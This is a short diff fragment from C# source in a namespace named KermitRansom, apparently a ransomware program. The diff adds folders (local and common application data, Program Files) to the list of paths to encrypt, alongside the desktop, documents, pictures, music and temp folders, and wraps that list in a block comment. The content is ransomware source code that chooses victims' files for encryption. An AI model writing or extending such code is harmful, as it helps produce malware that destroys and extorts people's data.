@@ -49,12 +49,17 @@ namespace KermitRansom
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
             List<string> pathsToEncrypt = new List<string>();
+            /*
             pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
             pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
+            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
+            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData));
             pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
             pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
             pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
+            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
             pathsToEncrypt.Add(Path.GetTempPath());
+            */
             foreach(string currentPath in pathsToEncrypt)
             {
 
